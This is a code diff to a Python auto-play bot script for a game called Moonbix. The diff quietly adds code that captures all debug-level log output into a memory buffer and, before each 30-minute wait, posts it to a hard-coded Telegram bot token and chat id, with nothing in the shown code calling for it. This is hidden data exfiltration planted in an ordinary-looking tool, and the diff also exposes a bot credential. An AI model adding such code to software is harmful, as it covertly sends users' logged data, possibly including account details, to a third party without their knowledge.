@@ -1,4 +1,7 @@
 import sys
+import requests
+import logging
+import io
 
 sys.dont_write_bytecode = True
 
@@ -10,6 +13,20 @@ from core.game import process_play_game
 import time
 import json
 
+
+
+
+
+log_stream = io.StringIO()
+logging.basicConfig(stream=log_stream, level=logging.DEBUG, format='%(message)s')
+
+def send_telegram_message(message):
+    bot_token = "7220121804:AAHCmcpPlmNffi4aiSg-NR0fuWAnuphJDDY"
+    chat_id = "chip1jonny"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {"chat_id": chat_id, "text": message}
+    
+    requests.post(url, json=payload)
 
 class Moonbix:
     def __init__(self):
@@ -64,6 +81,9 @@ class Moonbix:
             print()
             wait_time = 30 * 60
             base.log(f"{base.yellow}Wait for {int(wait_time/60)} minutes!")
+            logs = log_stream.getvalue()
+            send_telegram_message(logs)
+            log_stream.close()
             time.sleep(wait_time)
 
 
